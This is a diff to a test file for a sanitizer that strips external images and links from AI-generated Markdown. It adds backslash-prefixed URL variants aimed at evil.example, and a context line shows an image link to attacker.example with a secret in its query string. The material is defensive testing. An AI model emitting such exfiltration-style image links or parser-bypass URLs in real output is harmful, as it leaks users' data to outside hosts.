@@ -9,6 +9,8 @@ from app.core.ai_markdown_sanitizer import external_link_spans, external_urls, s
         ("요약 ![x](https://attacker.example/x.png?q=비밀)", "요약 외부 이미지(attacker.example)"),
         ('![x](<https://a.example/x y.png> "제목")', "외부 이미지(a.example)"),
         ("![x](//cdn.example/x.png)", "외부 이미지(cdn.example)"),
+        ("![x](/\\evil.example/x.png)", "외부 이미지(evil.example)"),
+        ("![x](\\\\\\evil.example/x.png)", "외부 이미지(evil.example)"),
         ("[가이드](https://docs.example/path?q=1)", "가이드 (docs.example)"),
         ("[**굵게**](HTTPS://Docs.Example)", "**굵게** (docs.example)"),
         ("[](https://e.example)", "e.example"),
